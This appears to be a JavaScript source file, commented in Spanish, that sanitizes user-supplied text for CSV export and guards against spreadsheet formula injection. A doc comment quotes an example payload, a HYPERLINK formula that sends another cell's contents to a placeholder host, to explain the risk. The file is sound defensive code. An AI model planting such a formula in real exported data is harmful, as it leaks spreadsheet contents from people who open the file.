// Caracteres que abren la puerta a la inyeccion de formulas cuando van al principio
// de una celda: Excel evalua la celda al abrir el fichero.
const PELIGROSOS = ['=', '+', '-', '@', '\t', '\r', '\n'];

// Control C0 y C1, mas marcas bidireccionales, anchura cero y BOM.
const INVISIBLES = new RegExp(
  '[' +
    '\\u0000-\\u0008\\u000B\\u000C\\u000E-\\u001F\\u007F' +
    '\\u0080-\\u009F' +
    '\\u200B-\\u200F' +
    '\\u202A-\\u202E' +
    '\\u2066-\\u2069' +
    '\\uFEFF' +
    ']',
  'g',
);

/**
 * Limpia un texto controlado por el usuario antes de escribirlo en un fichero.
 *
 * Repite la normalizacion del dominio a proposito: un exportador puede recibir datos
 * que entraron antes de que existiera la validacion, o de una importacion futura.
 * Ver docs/export.md.
 *
 * @param {unknown} value Valor crudo.
 * @returns {string} Texto seguro para una celda.
 */
export function sanitizeCell(value) {
  if (value === null || value === undefined) return '';
  return String(value).replace(INVISIBLES, '').replace(/\s+/g, ' ').trim();
}

/**
 * Indica si un texto empezaria por un caracter que Excel interpretaria como formula.
 *
 * El riesgo es concreto: una rutina llamada
 * =HYPERLINK("https://ejemplo/?d="&A2,"Abrir") exfiltra el contenido de otras celdas
 * cuando el usuario comparte el fichero.
 *
 * @param {string} texto Texto ya saneado.
 * @returns {boolean}
 */
export const needsFormulaGuard = (texto) => texto.length > 0 && PELIGROSOS.includes(texto[0]);

/**
 * Protege un valor para CSV: entrecomilla siempre, duplica las comillas internas y
 * prefija con apostrofo si empezaria por un caracter de formula.
 *
 * En XLSX no hace falta el apostrofo, porque exceljs escribe cadenas como cadenas y
 * una formula exige declararla de forma explicita. Por eso esto es solo del CSV.
 *
 * @param {unknown} value Valor crudo.
 * @returns {string} Campo listo para concatenar en una fila.
 */
export function toCsvField(value) {
  const limpio = sanitizeCell(value);
  const protegido = needsFormulaGuard(limpio) ? `'${limpio}` : limpio;
  return `"${protegido.replace(/"/g, '""')}"`;
}
